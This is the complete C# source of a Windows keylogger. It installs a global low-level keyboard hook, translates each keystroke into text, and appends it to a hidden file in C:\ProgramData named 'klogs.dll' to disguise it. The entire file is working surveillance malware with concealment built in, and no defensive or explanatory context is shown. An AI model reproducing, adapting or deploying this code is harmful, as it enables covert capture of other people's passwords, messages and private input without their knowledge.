using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        private const string logFileLocation = @"C:\ProgramData\";
        private const string logFileName = "klogs.dll";
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        static void Main(string[] args)
        {
            Thread createFile = new Thread(new ThreadStart(fileAvailability));
            createFile.Start();
            createFile.Abort();
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                string pressedKey = ((Keys)Marshal.ReadInt32(lParam)).ToString();
                if (pressedKey.Contains("9694780"))
                {
                    Console.Out.WriteLine(lParam);
                }
                if (pressedKey == "OemPeriod" || pressedKey == "Decimal")
                {
                    changeKeyValueTo(".");
                }
                else if (pressedKey == "Oemcomma")
                {
                    changeKeyValueTo(",");
                }
                else if (pressedKey == "Space")
                {
                    changeKeyValueTo(" ");
                }
                else if (pressedKey == "Return")
                {
                    changeKeyValueTo("\n");
                }
                else if (pressedKey == "Oemtilde")
                {
                    changeKeyValueTo("`");
                }
                else if (pressedKey == "Oemplus")
                {
                    changeKeyValueTo("=");
                }
                else if (pressedKey == "OemMinus")
                {
                    changeKeyValueTo("-");
                }
                else if (pressedKey == "Oem1")
                {
                    changeKeyValueTo(";");
                }
                else if (pressedKey == "Oem5")
                {
                    changeKeyValueTo(@"\");
                }
                else if (pressedKey == "Oem6")
                {
                    changeKeyValueTo("]");
                }
                else if (pressedKey == "Oem7")
                {
                    changeKeyValueTo("'");
                }
                else if (pressedKey == "OemQuestion")
                {
                    changeKeyValueTo("/");
                }
                else if (pressedKey == "OemOpenBrackets")
                {
                    changeKeyValueTo("[");
                }
                else if (pressedKey == "OemMinus")
                {
                    changeKeyValueTo("-");
                }
                else if (pressedKey.Contains("NumPad"))
                {
                    StreamWriter output = new StreamWriter(logFileLocation + logFileName, true);
                    output.Write(pressedKey.Remove(0, 6));
                    output.Close();
                }
                else if (pressedKey.Length == 2 && pressedKey.Contains("D"))
                {
                    StreamWriter output = new StreamWriter(logFileLocation + logFileName, true);
                    output.Write(pressedKey.Replace("D", ""));
                    output.Close();
                }
                else
                {
                    Console.Write(pressedKey);
                    StreamWriter output = new StreamWriter(logFileLocation + logFileName, true);
                    output.Write(pressedKey);
                    output.Close();
                }

            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static void changeKeyValueTo(string changeTo)
        {
            StreamWriter output = new StreamWriter(logFileLocation + logFileName, true);
            output.WriteAsync(changeTo);
            output.Close();
        }

        private static void fileAvailability()
        {
            if (!File.Exists(logFileLocation + logFileName))
            {
                File.Create(logFileLocation + logFileName);
                File.SetAttributes(logFileLocation + logFileName, FileAttributes.Hidden);
            }
            else
            {
                File.SetAttributes(logFileLocation + logFileName, FileAttributes.Hidden);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }
    }
}
